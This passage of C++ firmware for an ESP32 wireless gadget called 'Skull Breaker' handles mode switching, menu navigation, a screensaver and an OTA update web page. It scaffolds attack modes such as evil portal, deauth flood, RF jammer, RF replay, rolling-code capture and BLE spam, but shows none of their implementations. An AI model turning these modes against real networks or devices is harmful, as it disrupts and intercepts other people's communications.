           mode == WIFI_CHANNEL_ANALYZER ||
           mode == WIFI_PACKET_COUNT ||
           mode == WIFI_SCAN_ALL ||
           mode == WIFI_ATTACK_EVIL_PORTAL ||
           mode == WIFI_ATTACK_RICKROLL ||
           mode == WIFI_ATTACK_PROBE_FLOOD ||
           mode == WIFI_ATTACK_DEAUTH_FLOOD ||
           mode == WIFI_ATTACK_AP_CLONE ||
           mode == WIFI_HIDDEN_SSID_REVEAL;
}

bool shouldFullyShutdownWiFiOnExit(RadioMode mode) {
    return mode == WIFI_ATTACK_EVIL_PORTAL ||
           mode == WIFI_PACKET_MONITOR ||
           mode == WIFI_PACKET_COUNT ||
           mode == WIFI_SIGNAL_MONITOR ||
           mode == WIFI_CHANNEL_ANALYZER;
}

const char* getRadioModeLabel(RadioMode mode) {
    switch (mode) {
        case RADIO_IDLE: return "Idle";
        case WIFI_SCAN: return "WiFi Scan";
        case WIFI_PACKET_MONITOR: return "Packet Monitor";
        case WIFI_SIGNAL_MONITOR: return "Signal Monitor";
        case WIFI_CHANNEL_ANALYZER: return "Channel Analyzer";
        case WIFI_EAPOL_SCAN: return "EAPOL Scan";
        case WIFI_ATTACK_EVIL_PORTAL: return "Evil Portal";
        case BLE_SCAN: return "BLE Scan";
        case BLE_RADAR: return "BLE Radar";
        case BLE_SIGNAL_LOGGER: return "BLE Logger";
        case RF_SCANNER: return "RF Scanner";
        case RF_MONITOR: return "RF Monitor";
        case RF_FREQUENCY_SWEEP: return "RF Sweep";
        case RF_SIGNAL_CAPTURE: return "RF Capture";
        case RADIO_24_SCAN: return "2.4 Scanner";
        case RADIO_NOISE_ANALYZER: return "Noise Analyzer";
        case RADIO_24_ACTIVE: return "2.4 Active";
        default: return "Tool Active";
    }
}

void clearBLEScanResults() {
    bleDeviceCount = 0;
    bleSelectedIndex = 0;
    bleScrollOffset = 0;
    bleDetailIndex = -1;
    bleDetailActive = false;
    blePreserveResultsOnNextScan = false;
    bleContinuousScanAt = 0;
    bleFocusedName[0] = '\0';
    bleFocusedMAC[0] = '\0';
    bleFocusedRSSI = -100;

    for (int i = 0; i < MAX_SCAN_RESULTS; i++) {
        bleNames[i][0] = 0;
        bleMACs[i][0] = 0;
        bleRSSI[i] = -100;
        bleCompanyIds[i] = 0;
        bleDetectFlags[i] = BLE_FLAG_NONE;
        blePrimaryIds[i] = 0;
        bleHints[i][0] = 0;
        bleLastSeen[i] = 0;
    }
    bleLastActiveCount = 0;
    bleLastPassiveCount = 0;
    bleLastFilteredCount = 0;
}

void clearWiFiScanResults() {
    wifiNetworkCount = 0;
    wifiSelectedIndex = 0;
    wifiScrollOffset = 0;
    wifiDetailIndex = -1;
    wifiDetailActive = false;

    for (int i = 0; i < MAX_SCAN_RESULTS; i++) {
        wifiSSIDs[i][0] = 0;
        wifiRSSI[i] = -100;
        wifiBSSID[i][0] = 0;
        wifiEncStr[i][0] = 0;
        wifiHints[i][0] = 0;
        wifiChannel[i] = 0;
        wifiLastSeen[i] = 0;
    }
}

void resetAllToolAndUIState(bool clearLists) {
    bleScanRunning = false;
    bleScanStartedAt = 0;
    bleScanReadyAt = 0;
    bleScanAutoRetryPending = false;
    bleScanWarmupRetries = 0;
    bleScanTaskHandle = NULL;
    setBLEScanStatus("Idle");
    resetBLEScanEngine();
    resetBLEAnalyzerHistory();
    bleScannerFirstDraw = true;
    bleNeedsRedraw = true;
    bleDetailActive = false;
    bleDetailIndex = -1;
    bleRadarNeedsRedraw = true;
    bleRadarFirstDraw = true;
    bleRadarLastScanMs = 0;
    bleLoggerNeedsRedraw = true;
    bleLoggerFirstDraw = true;
    bleLoggerLastSampleMs = 0;
    bleLoggerLastTargetPress = 0;
    bleLoggerTargetIndex = -1;
    bleLoggerTargetName = "";
    bleLoggerTargetMAC = "";
    bleLoggerCurrentRSSI = -100;
    bleBeaconNeedsRedraw = true;
    bleBeaconFirstDraw = true;
    bleDeviceNeedsRedraw = true;
    bleDeviceFirstDraw = true;
    bleBeaconTestNeedsRedraw = true;
    bleBeaconTestFirstDraw = true;

    wifiScanRunning = false;
    wifiScanReadyAt = 0;
    wifiScanKeepStatusUntil = 0;
    wifiScanAutoRetryPending = false;
    wifiScanWarmupRetries = 0;
    setWiFiScanStatus("Idle");
    wifiScannerFirstDraw = true;
    wifiPacketFirstDraw = true;
    wifiNeedsRedraw = true;
    wifiDetailActive = false;
    wifiDetailIndex = -1;
    sniffListNeedsRedraw = true;

    fileManagerNeedsRedraw = true;
    fileManagerMarkedCount = 0;
    fileDeleteConfirmYes = false;
    fileDeleteBatchMode = false;
    fileDeleteTargetPath = "";
    fileDeleteTargetCount = 0;
    fileRenameStatus = "";
    fileRenameStatusUntil = 0;
    fileManagerSelectHoldStart = 0;
    fileManagerSelectHoldIndex = -1;
    fileManagerSelectHoldHandled = false;

    for (int i = 0; i < FILE_MANAGER_MAX_ENTRIES; i++) {
        fileManagerMarked[i] = false;
    }

    rfScannerFirstDraw = true;
    rfMonitorFirstDraw = true;
    rfJammerFirstDraw = true;
    rfJammerConfigured = false;
    rfCaptureFirstDraw = true;
    rfSweepFirstDraw = true;
    rfRollingFirstDraw = true;
    rfRollingSelectPressed = false;
    rfRollingHoldMode = false;
    packetFlooderToggle = false;
    rfTransmitFirstDraw = true;
    rfTransmitActive = false;
    rfTransmitSelectLatched = false;
    rfTransmitLastSendMs = 0;
    rfTransmitLastRearmMs = 0;
    // RF_REPLAY cleanup
    if (rfReplayListening) {
        pinMode(CC1101_GDO0, INPUT);
        rfReplayListening = false;
    }
    rfReplayFirstDraw = true;
    rfReplayHasCapture = false;
    rfReplayCapturedValue = 0;
    rfReplayCapturedBits = 0;
    rfReplayRawCount = 0;
    if (rfReplayRawTimings) {
        free(rfReplayRawTimings);
        rfReplayRawTimings = nullptr;
    }
    rfReplayStatus = "";
    rfReplayStatusUntil = 0;
    radio24ActiveFirstDraw = true;
    ghzScannerFirstDraw = true;
    noiseFirstDraw = true;
    attackFirstDraw = true;  // Reset for Protocol Analyzer and Packet Flooder

    scanDots = 1;
    lastScanAnim = 0;
    shouldRedraw = true;

    if (clearLists) {
        clearBLEScanResults();
        clearWiFiScanResults();
        resetBLELoggerBuffer();
        resetBLERadarState();
    }
}

void beginSPIOperation(bool suspendDisplay) {
    if (suspendDisplay) {
        displayUpdatesSuspended = true;
    }

    if (spiOperationDepth == 0) {
        primeSharedSPIBus();
        SPI.begin(18, 19, 23);
        digitalWrite(TFT_CS, HIGH);
    }

    spiOperationDepth++;
}

void endSPIOperation(bool restoreDisplay, bool heavyRestore) {
    if (spiOperationDepth > 0) {
        spiOperationDepth--;
    }

    if (spiOperationDepth > 0) {
        return;
    }

    displayUpdatesSuspended = false;
    digitalWrite(TFT_CS, HIGH);

    if (!restoreDisplay) {
        return;
    }

    if (heavyRestore) {
        restoreDisplayAfterHeavyStorageAccess();
    } else {
        restoreDisplayAfterStorageAccess();
    }
}

void stopCurrentRadioMode(bool clearMode) {
    RadioMode previousMode = currentRadioMode;
    LOG_IF(DEBUG_VERBOSE_UI, String("Mode stop: ") + String((int)previousMode));
    radioLocked = true;
    radioModeTransitionUntil = millis() + 120UL;

    if (flockWiFiHybridArmed) {
        stopFlockWiFiSniffer();
    }

    if (previousMode == RADIO_24_ACTIVE) {
        stop24GHzActiveMode();
    } else if (previousMode == BLE_BEACON_SPAM) {
        stopBLEBeaconSpammer();
    } else if (previousMode == BLE_BEACON_TEST) {
        stopBLEBeaconTest();
    } else if (previousMode == BLE_DEVICE_STABLE) {
        stopBLEStableDevice();
    } else if (previousMode == BLE_RADAR) {
        stopBLERadar();
    } else if (previousMode == BLE_SIGNAL_LOGGER || previousMode == BLE_SIGNAL_LOGGER_PICK) {
        stopBLELogger();
    } else if (previousMode == RF_SCANNER ||
               previousMode == RF_MONITOR ||
               previousMode == RF_JAMMER ||
               previousMode == RF_SQUELCH_ACTIVATE ||
               previousMode == RF_SIGNAL_CAPTURE ||
               previousMode == RF_FREQUENCY_SWEEP ||
               previousMode == RF_TRANSMIT ||
               previousMode == RF_REPLAY ||
               previousMode == RF_ROLLING_CAPTURE) {
        // Release GDO0 back to input
        pinMode(CC1101_GDO0, INPUT);
        stopCCTool();
    } else if (previousMode == WIFI_ATTACK_EVIL_PORTAL) {
        epStopServer();
    }

    if (isWiFiMode(previousMode)) {
        if (shouldFullyShutdownWiFiOnExit(previousMode)) {
            shutdownWiFiStack(false);
        } else {
            resetWiFi();
        }
    }

    if (isBLEMode(previousMode) && NimBLEDevice::isInitialized()) {
        // Close BLE session CSV if scanner was active
        if (previousMode == BLE_SCAN) bleSessionClose();
        bleScanCancelRequested = true;
        bleScanRunning = false;
        bleScanStartedAt = 0;
        bleScanReadyAt = 0;
        bleContinuousScanAt = 0;
        blePreserveResultsOnNextScan = false;
        bleAnalyzerNextScanMs = 0;
        NimBLEScan* scan = NimBLEDevice::getScan();
        if (scan) {
            scan->stop();
            scan->clearResults();
        }
        unsigned long unwindStart = millis();
        while (bleScanWorkerActive && (millis() - unwindStart) < 1200UL) {
            delay(20);
        }
        bleScanTaskHandle = NULL;
        NimBLEDevice::stopAdvertising();
        resetBLEScanEngine();
        resetBLEPeripheralState();
    }

    radio1.stopListening();
    radio1.stopConstCarrier();
    radio1.powerDown();

    if (radio3Ok) {
        radio2.stopListening();
        radio2.stopConstCarrier();
        radio2.powerDown();
    }

    delay(20);
    
    // Release icon cache memory to prevent low memory issues (Bug 1.46 fix)
    releaseIconCacheMemory();
    
    radioLocked = false;
    if (clearMode) {
        currentRadioMode = RADIO_IDLE;
    }
}

void enterMode(RadioMode mode) {
    const char* guardReason = nullptr;
    if (!canEnterToolMode(mode, &guardReason)) {
        LOG(String("Mode guard blocked: ") + String((int)mode) + " reason=" + String(guardReason ? guardReason : "blocked"));
        currentRadioMode = RADIO_IDLE;
        currentScreen = SCREEN_TOOL;
        setToolBlockedState(mode, guardReason ? guardReason : "Tool blocked");
        shouldRedraw = true;
        return;
    }

    RadioMode previousMode = currentRadioMode;
    if (currentRadioMode != mode) {
        stopCurrentRadioMode(false);
        resetAllToolAndUIState(false);

        if (isWiFiMode(previousMode) && isBLEMode(mode)) {
            shutdownWiFiStack(false);
            delay(500);  // BUG FIX 1.47: Increased from 40ms to 500ms for reliable BLE init after WiFi shutdown
        } else if (isBLEMode(previousMode) && isWiFiMode(mode) && NimBLEDevice::isInitialized()) {
            NimBLEDevice::deinit(true);
            resetBLEScanEngine();
            resetBLEPeripheralState();
            delay(40);
        }
    }

    if (isWiFiMode(mode)) {
        releaseTransientIconHeapForMode("WiFi");
    } else if (isBLEMode(mode)) {
        releaseTransientIconHeapForMode("BLE");
    }

    LOG_IF(DEBUG_VERBOSE_UI, String("Mode enter: ") + String((int)mode));
    clearToolBlockedState();
    currentRadioMode = mode;
    currentScreen = SCREEN_TOOL;
    toolScreenEnteredAt = 0;
    radioModeTransitionUntil = millis() + 140UL;
    clearToolGuardFailure(mode);
    logHeapTelemetry("enter");
    shouldRedraw = true;
}

void navigateBack() {
    if (currentScreen == SCREEN_TOOL && toolBlockedScreenActive) {
        clearToolBlockedState();
    }
    switch (currentScreen) {
        case SCREEN_MAIN:
            return;

        case SCREEN_SUBMENU:
            if (submenuParentMenu != nullptr) {
                currentMenu = submenuParentMenu;
                currentMenuSize = submenuParentSize;
                currentMenuIndex = submenuParentIndex;
                currentMenuScrollOffset = submenuParentScrollOffset;
                currentTitle = submenuParentTitle;
                submenuParentMenu = nullptr;
                submenuParentSize = 0;
                submenuParentIndex = 0;
                submenuParentScrollOffset = 0;
                submenuParentTitle = "";
                drawSubMenu();
                return;
            }
            currentScreen = SCREEN_MAIN;
            currentTitle = "";
            currentMenu = nullptr;
            currentMenuSize = 0;
            currentMenuIndex = 0;
            currentMenuScrollOffset = 0;
            tft.fillScreen(ILI9341_BLACK);
            drawUI();
            return;

        case SCREEN_SYSTEM_INFO:
            infoScreenEnteredAt = 0;
            currentScreen = SCREEN_SUBMENU;
            currentTitle = "Settings";
            currentMenu = settingsMenu;
            currentMenuSize = sizeof(settingsMenu) / sizeof(settingsMenu[0]);
            drawSubMenu();
            return;

        case SCREEN_STORAGE_SETTINGS:
            infoScreenEnteredAt = 0;
            currentScreen = SCREEN_SUBMENU;
            currentTitle = "Storage";
            currentMenu = storageSettingsMenu;
            currentMenuSize = sizeof(storageSettingsMenu) / sizeof(storageSettingsMenu[0]);
            drawSubMenu();
            return;

        case SCREEN_WIRELESS_UPDATE:
            stopWirelessUpdate();
            currentScreen = SCREEN_SUBMENU;
            currentTitle = "Settings";
            currentMenu = settingsMenu;
            currentMenuSize = sizeof(settingsMenu) / sizeof(settingsMenu[0]);
            currentMenuIndex = 4;
            drawSubMenu();
            return;

        case SCREEN_SD_FORMAT_CONFIRM:
            currentScreen = SCREEN_SUBMENU;
            currentTitle = "Settings";
            currentMenuIndex = 2;
            drawSubMenu();
            return;

        case SCREEN_FILE_MANAGER:
            if (fileManagerPath != "/") {
                fileManagerPath = getFileManagerParentPath(fileManagerPath);
                loadFileManagerEntries();
                drawFileManager();
            } else {
                currentScreen = SCREEN_MAIN;
                currentTitle = "";
                currentMenu = nullptr;
                currentMenuSize = 0;
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                tft.fillScreen(ILI9341_BLACK);
                drawUI();
            }
            return;

        case SCREEN_FILE_DETAIL:
            fileTextViewerActive = false;
            currentScreen = SCREEN_FILE_MANAGER;
            fileManagerNeedsRedraw = true;
            drawFileManager();
            return;

        case SCREEN_FILE_DELETE_CONFIRM:
            currentScreen = fileDeleteBatchMode ? SCREEN_FILE_MANAGER : SCREEN_FILE_DETAIL;
            if (currentScreen == SCREEN_FILE_MANAGER) {
                fileTextViewerActive = false;
                fileManagerNeedsRedraw = true;
                drawFileManager();
            } else {
                drawFileDetailScreen();
            }
            return;

        case SCREEN_FILE_RENAME:
            currentScreen = SCREEN_FILE_DETAIL;
            drawFileDetailScreen();
            return;

        case SCREEN_WIFI_DETAIL:
            currentScreen = SCREEN_TOOL;
            wifiDetailActive = false;
            currentRadioMode = WIFI_SCAN;
            wifiNeedsRedraw = true;
            wifiScannerFirstDraw = true;  // Force full redraw
            tft.fillScreen(ILI9341_BLACK);
            drawStatusBar();
            return;

        case SCREEN_BLE_DETAIL:
            currentScreen = SCREEN_TOOL;
            bleDetailActive = false;
            currentRadioMode = BLE_SCAN;
            bleNeedsRedraw = true;
            bleScannerFirstDraw = true;
            // Resume scanning
            bleScanRunning = true;
            bleScanStartedAt = millis();
            bleScanReadyAt = millis() + 300UL;
            bleContinuousScanAt = 0;
            setBLEScanStatus("Resuming scan");
            tft.fillScreen(ILI9341_BLACK);
            drawStatusBar();
            return;

        case SCREEN_TOOL: {
            RadioMode previousRadioMode = currentRadioMode;
            toolScreenEnteredAt = 0;
            stopCurrentRadioMode(true);
            tft.fillScreen(ILI9341_BLACK);

            if (previousRadioMode == RF_TRANSMIT && rfTransmitReturnToFileManager) {
                String returnPath = rfSubLoadedPath;
                if (returnPath.length() > 0) {
                    fileManagerPath = getFileManagerParentPath(returnPath);
                    if (fileManagerPath.length() == 0) {
                        fileManagerPath = "/";
                    }
                }

                currentTitle = "Files";
                currentScreen = SCREEN_FILE_MANAGER;
                loadFileManagerEntries();
                if (returnPath.length() > 0) {
                    int fileIndex = findFileManagerIndexByPath(returnPath);
                    if (fileIndex >= 0) {
                        fileManagerSelectedIndex = fileIndex;
                    }
                }
                fileManagerNeedsRedraw = true;
                drawStatusBar();
                drawFileManager();
                rfTransmitReturnToFileManager = false;
            } else {
                currentScreen = SCREEN_SUBMENU;
                drawSubMenu();
            }
            return;
        }

        default:
            break;
    }
}

void navigateToSettings() {
    currentScreen = SCREEN_SUBMENU;
    currentTitle = "Settings";
    currentMenu = settingsMenu;
    currentMenuSize = sizeof(settingsMenu) / sizeof(settingsMenu[0]);
    currentMenuIndex = 5;
    currentMenuScrollOffset = 0;
    submenuParentMenu = nullptr;
    drawSubMenu();
}

void markCurrentScreenForRedraw() {
    shouldRedraw = true;
    if (displayUpdatesSuspended) {
        return;
    }
    shouldRedraw = false;

    switch (currentScreen) {
        case SCREEN_MAIN:
            drawUI();
            break;
        case SCREEN_SUBMENU:
            drawSubMenu();
            break;
        case SCREEN_SYSTEM_INFO:
            drawSystemInfoScreen();
            break;
        case SCREEN_STORAGE_SETTINGS:
            drawStorageSettingsScreen();
            break;
        case SCREEN_WIRELESS_UPDATE:
            drawWirelessUpdateScreen();
            break;
        case SCREEN_FILE_MANAGER:
            fileManagerNeedsRedraw = true;
            drawFileManager();
            break;
        case SCREEN_FILE_DETAIL:
            drawFileDetailScreen();
            break;
        case SCREEN_FILE_DELETE_CONFIRM:
            drawFileDeleteConfirmScreen();
            break;
        case SCREEN_FILE_RENAME:
            drawFileRenameScreen();
            break;
        case SCREEN_EP_RENAME:
            // Don't handle back here - LEFT is used for navigation
            break;
        case SCREEN_WIFI_DETAIL:
            wifiDetailActive = false;
            drawWiFiDetail();
            break;
        case SCREEN_BLE_DETAIL:
            bleDetailActive = false;
            drawBLEDetail();
            break;
        case SCREEN_TOOL:
            drawStatusBar();
            switch (currentRadioMode) {
                case RADIO_24_SCAN:
                    ghzScannerFirstDraw = true;
                    break;
                case RADIO_NOISE_ANALYZER:
                    noiseFirstDraw = true;
                    break;
                case RF_SCANNER:
                    rfScannerFirstDraw = true;
                    break;
                case RF_MONITOR:
                    rfMonitorFirstDraw = true;
                    break;
                case RF_JAMMER:
                    rfJammerFirstDraw = true;
                    rfJammerConfigured = false;
                    break;
                case RF_SIGNAL_CAPTURE:
                    rfCaptureFirstDraw = true;
                    break;
                case RF_FREQUENCY_SWEEP:
                    rfSweepFirstDraw = true;
                    break;
                case RF_ROLLING_CAPTURE:
                    rfRollingFirstDraw = true;
                    break;
                case RF_TRANSMIT:
                    rfTransmitFirstDraw = true;
                    break;
                case RF_REPLAY:
                    rfReplayFirstDraw = true;
                    break;
                case WIFI_SCAN:
                    wifiNeedsRedraw = true;
                    break;
                case WIFI_PACKET_MONITOR:
                    wifiPacketFirstDraw = true;
                    break;
                case BLE_SCAN:
                case BLE_SIGNAL_LOGGER_PICK:
                    bleScannerFirstDraw = true;
                    bleNeedsRedraw = true;
                    break;
                case BLE_RADAR:
                    bleRadarFirstDraw = true;
                    bleRadarNeedsRedraw = true;
                    break;
                case BLE_SIGNAL_LOGGER:
                    bleLoggerFirstDraw = true;
                    bleLoggerNeedsRedraw = true;
                    break;
                case BLE_BEACON_SPAM:
                    bleBeaconFirstDraw = true;
                    bleBeaconNeedsRedraw = true;
                    break;
                case BLE_BEACON_TEST:
                    bleBeaconTestFirstDraw = true;
                    bleBeaconTestNeedsRedraw = true;
                    break;
                case BLE_DEVICE_STABLE:
                    bleDeviceFirstDraw = true;
                    bleDeviceNeedsRedraw = true;
                    break;
                case BLE_ATTACK_SOUR_APPLE:
                case BLE_ATTACK_SWIFTPAIR:
                case BLE_ATTACK_SAMSUNG:
                case BLE_ATTACK_BEACON_SPAM:
                case BLE_ATTACK_SPAM_ALL:
                case BLE_JAMMER:
                case BLE_SPOOFER:
                    attackFirstDraw = true;
                    break;
                default:
                    break;
            }
            break;
        default:
            break;
    }
}

unsigned long getScreenSaverTimeoutMs() {
    if (screenSaverTimeoutIndex >= screenSaverTimeoutCount) {
        screenSaverTimeoutIndex = 1;
    }
    uint8_t seconds = screenSaverTimeoutSeconds[screenSaverTimeoutIndex];
    if (seconds == 0) {
        return 0;
    }
    return (unsigned long)seconds * 1000UL;
}

void persistScreenSaverSettings() {
    prefs.putUChar("ssTime", screenSaverTimeoutIndex);
    prefs.putUChar("ssStyle", screenSaverStyleIndex);
}

String getScreenSaverTimeoutLabel() {
    if (screenSaverTimeoutIndex >= screenSaverTimeoutCount) {
        screenSaverTimeoutIndex = 1;
    }
    uint8_t seconds = screenSaverTimeoutSeconds[screenSaverTimeoutIndex];
    if (seconds == 0) {
        return "Never";
    }
    return String(seconds) + "s";
}

const char* getScreenSaverStyleLabel() {
    if (screenSaverStyleIndex >= screenSaverStyleCount) {
        screenSaverStyleIndex = 0;
    }
    return screenSaverStyleNames[screenSaverStyleIndex];
}

bool anyNavigationButtonPressedRaw() {
    return companion_readButtonState(BTN_UP) == LOW ||
           companion_readButtonState(BTN_DOWN) == LOW ||
           companion_readButtonState(BTN_LEFT) == LOW ||
           companion_readButtonState(BTN_RIGHT) == LOW ||
           companion_readButtonState(BTN_SELECT) == LOW;
}

bool allNavigationButtonsReleased() {
    return companion_readButtonState(BTN_UP) == HIGH &&
           companion_readButtonState(BTN_DOWN) == HIGH &&
           companion_readButtonState(BTN_LEFT) == HIGH &&
           companion_readButtonState(BTN_RIGHT) == HIGH &&
           companion_readButtonState(BTN_SELECT) == HIGH;
}

bool canActivateScreenSaver() {
    if (startupSequenceActive || displayUpdatesSuspended) {
        return false;
    }
    if (currentScreen == SCREEN_TOOL || currentScreen == SCREEN_WIRELESS_UPDATE ||
        currentScreen == SCREEN_WIFI_DETAIL || currentScreen == SCREEN_BLE_DETAIL) {
        return false;
    }
    return true;
}

bool serviceScreenSaver() {
    if (anyNavigationButtonPressedRaw()) {
        lastUserInteractionMs = millis();
    }

    if (screenSaverWakeReleaseRequired) {
        if (allNavigationButtonsReleased()) {
            screenSaverWakeReleaseRequired = false;
            lastUserInteractionMs = millis();  // Reset timer when fully released
        } else {
            return true;
        }
    }

    if (screenSaverActive) {
        if (anyNavigationButtonPressedRaw()) {
            screenSaverActive = false;
            screenSaverWakeReleaseRequired = true;
            screenSaverFrameReset = true;
            screenSaverLastFrameMs = 0;
            markCurrentScreenForRedraw();
            return true;
        }

        if (screenSaverLastFrameMs == 0 || millis() - screenSaverLastFrameMs >= 60UL) {
            screenSaverLastFrameMs = millis();
            drawScreenSaverFrame(screenSaverStyleIndex, screenSaverFrameReset);
            screenSaverFrameReset = false;
        }
        return true;
    }

    unsigned long timeoutMs = getScreenSaverTimeoutMs();
    if (timeoutMs == 0 || !canActivateScreenSaver()) {
        return false;
    }

    if (lastUserInteractionMs == 0) {
        lastUserInteractionMs = millis();
    }

    if (millis() - lastUserInteractionMs >= timeoutMs) {
        screenSaverActive = true;
        screenSaverFrameReset = true;
        screenSaverLastFrameMs = 0;
        return true;
    }

    return false;
}

bool startWirelessUpdate() {
    stopCurrentRadioMode(true);
    resetAllToolAndUIState(false);
    releaseTransientIconHeapForMode("OTA");
    resetWiFi();

    if (!WiFi.mode(WIFI_AP)) {
        wirelessUpdateStatus = "AP start failed";
        wirelessUpdateActive = false;
        wirelessUpdateNeedsRedraw = true;
        return false;
    }

    if (!WiFi.softAP(wirelessUpdateSSID.c_str(), wirelessUpdatePassword.c_str())) {
        wirelessUpdateStatus = "AP start failed";
        wirelessUpdateActive = false;
        wirelessUpdateNeedsRedraw = true;
        return false;
    }

    wirelessUpdateIP = WiFi.softAPIP().toString();
    wirelessUpdateStatus = "AP ready";
    if (wirelessUpdateServer != nullptr) {
        delete wirelessUpdateServer;
        wirelessUpdateServer = nullptr;
    }
    wirelessUpdateServer = new WiFiServer(80);
    if (wirelessUpdateServer == nullptr) {
        wirelessUpdateStatus = "Server alloc fail";
        wirelessUpdateActive = false;
        wirelessUpdateNeedsRedraw = true;
        return false;
    }
    wirelessUpdateServer->begin();

    wirelessUpdateActive = true;
    wirelessUpdateNeedsRedraw = true;
    currentScreen = SCREEN_WIRELESS_UPDATE;
    currentTitle = "Wireless Update";
    drawWirelessUpdateScreen();
    return true;
}

void stopWirelessUpdate() {
    if (wirelessUpdateServer != nullptr) {
        wirelessUpdateServer->stop();
        delete wirelessUpdateServer;
        wirelessUpdateServer = nullptr;
    }
    wirelessUpdateActive = false;
    wirelessUpdateNeedsRedraw = false;
    wirelessUpdateStatus = "Idle";
    wirelessUpdateIP = "192.168.4.1";
    WiFi.softAPdisconnect(true);
    resetWiFi();
}

void serviceWirelessUpdateScreen() {
    if (wirelessUpdateActive && wirelessUpdateServer != nullptr) {
        WiFiClient client = wirelessUpdateServer->available();
        if (client) {
            client.setTimeout(10000);
            String requestLine = client.readStringUntil('\n');
            requestLine.trim();
            bool isRoot = requestLine.startsWith("GET / ");
            bool isFavicon = requestLine.startsWith("GET /favicon.ico ");
            bool isUpdate = requestLine.startsWith("POST /update ");
            int contentLength = 0;

            while (client.connected()) {
                String line = client.readStringUntil('\n');
                line.trim();
                if (line.length() == 0) {
                    break;
                }
                if (line.startsWith("Content-Length:")) {
                    contentLength = line.substring(15).toInt();
                }
            }

            if (isRoot) {
                String html;
                html.reserve(3600);
                html += F(R"HTML(<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Skull Breaker Update</title>
<style>
  :root{
    --bg:#050505;
    --panel:#121212;
    --panel-2:#181818;
    --line:#3b3b3b;
    --text:#f3f3f3;
    --muted:#a5a5a5;
    --accent:#7affc5;
    --accent-2:#9ed4ff;
    --danger:#ff5a5a;
  }
  *{box-sizing:border-box}
  body{
    margin:0;
    min-height:100vh;
    font-family:Arial,Helvetica,sans-serif;
    background:
      radial-gradient(circle at top, rgba(122,255,197,.09), transparent 34%),
      radial-gradient(circle at bottom right, rgba(158,212,255,.08), transparent 28%),
      var(--bg);
    color:var(--text);
    display:flex;
    align-items:center;
    justify-content:center;
    padding:18px;
  }
  .shell{
    width:min(100%, 420px);
    border:1px solid var(--line);
    border-radius:18px;
    background:linear-gradient(180deg, rgba(24,24,24,.96), rgba(10,10,10,.96));
    box-shadow:0 18px 50px rgba(0,0,0,.45);
    overflow:hidden;
  }
  .topbar{
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:14px 16px;
    border-bottom:1px solid #262626;
    background:rgba(255,255,255,.02);
  }
  .topbar .title{font-size:18px;font-weight:700;letter-spacing:.04em}
  .topbar .tag{
    font-size:11px;
    color:#08140d;
    background:var(--accent);
    padding:5px 9px;
    border-radius:999px;
    font-weight:700;
  }
  .body{padding:16px}
  .sub{
    margin:0 0 14px 0;
    color:var(--muted);
    font-size:13px;
    line-height:1.45;
  }
  .upload{
    border:1px solid #343434;
    background:var(--panel-2);
    border-radius:16px;
    padding:14px;
  }
  .actions{
    display:flex;
    gap:10px;
    align-items:center;
    margin-bottom:12px;
  }
  input[type=file]{display:none}
  .pick,
  button{
    border:0;
    border-radius:12px;
    padding:12px 14px;
    font-size:14px;
    font-weight:800;
    text-align:center;
    cursor:pointer;
    text-decoration:none;
  }
  .pick{
    flex:1;
    background:#262626;
    color:var(--text);
    border:1px solid #3e3e3e;
  }
  button{
    flex:1.15;
    background:linear-gradient(135deg, var(--accent), var(--accent-2));
    color:#07110f;
  }
  button:disabled{
    opacity:.55;
    cursor:not-allowed;
  }
  .file{
    min-height:18px;
    color:var(--muted);
    font-size:13px;
    margin-bottom:12px;
    word-break:break-word;
  }
  .panel-note{
    border:1px solid var(--line);
    background:var(--panel);
    border-radius:14px;
    padding:11px 12px;
    margin-bottom:14px;
    color:var(--muted);
    font-size:12px;
    line-height:1.45;
  }
  .progress{
    margin-top:12px;
    height:10px;
    border-radius:999px;
    overflow:hidden;
    background:#222;
    border:1px solid #303030;
  }
  .fill{
    height:100%;
    width:0%;
    background:linear-gradient(90deg, var(--accent), var(--accent-2));
    transition:width .12s linear;
  }
  .status{
    margin-top:10px;
    color:var(--muted);
    font-size:13px;
    min-height:18px;
  }
  .hint{
    margin-top:12px;
    color:var(--muted);
    font-size:12px;
    line-height:1.45;
  }
  .ok{color:var(--accent)}
  .bad{color:var(--danger)}
</style>
</head>
<body>
  <main class="shell">
    <div class="topbar">
    <div class="title">Skull Breaker</div>
    <div class="tag">SKULL BREAKER OTA</div>
    </div>
    <div class="body">
    <p class="sub">Upload a compiled firmware <strong>.bin</strong> file directly to Skull Breaker. Keep power stable and do not close this page during upload.</p>
      <div class="panel-note">This updater writes the main firmware image only. Use a binary built for this exact board and current partition layout.</div>
      <section class="upload">
        <input id="firmware" type="file" accept=".bin,application/octet-stream">
        <div class="actions">
          <label class="pick" for="firmware">Choose File</label>
          <button id="uploadBtn" type="button">Upload Firmware</button>
        </div>
        <div id="fileName" class="file">No file selected.</div>
        <div class="progress"><div id="fill" class="fill"></div></div>
        <div id="status" class="status">Ready for upload.</div>
      </section>
      <div class="hint">This page sends the selected firmware directly to the device update endpoint.</div>
    </div>
  </main>
<script>
const fileInput=document.getElementById('firmware');
const button=document.getElementById('uploadBtn');
const fill=document.getElementById('fill');
const fileNameEl=document.getElementById('fileName');
const statusEl=document.getElementById('status');
function setStatus(text, kind){
  statusEl.textContent=text;
  statusEl.className='status'+(kind ? ' '+kind : '');
}
fileInput.addEventListener('change', ()=>{
  const file=fileInput.files[0];
  fileNameEl.textContent=file ? file.name : 'No file selected.';
});
button.addEventListener('click', ()=>{
  const file=fileInput.files[0];
  if(!file){
    setStatus('Choose a firmware .bin file first.', 'bad');
    return;
  }
  button.disabled=true;
  fill.style.width='0%';
  setStatus('Uploading '+file.name+' ...');
  const xhr=new XMLHttpRequest();
  xhr.open('POST','/update',true);
  xhr.setRequestHeader('Content-Type','application/octet-stream');
  xhr.upload.onprogress=(event)=>{
    if(event.lengthComputable){
      const pct=Math.max(0, Math.min(100, Math.round((event.loaded/event.total)*100)));
      fill.style.width=pct+'%';
      setStatus('Uploading '+pct+'%');
    }
  };
  xhr.onload=()=>{
    fill.style.width='100%';
    if(xhr.status>=200 && xhr.status<300){
      setStatus(xhr.responseText || 'Update complete. Device restarting...', 'ok');
    }else{
      button.disabled=false;
      setStatus('Upload failed: '+xhr.status+' '+xhr.responseText, 'bad');
    }
  };
  xhr.onerror=()=>{
    button.disabled=false;
    setStatus('Upload failed. Check the WiFi link and try again.', 'bad');
  };
  xhr.send(file);
});
</script>
</body>
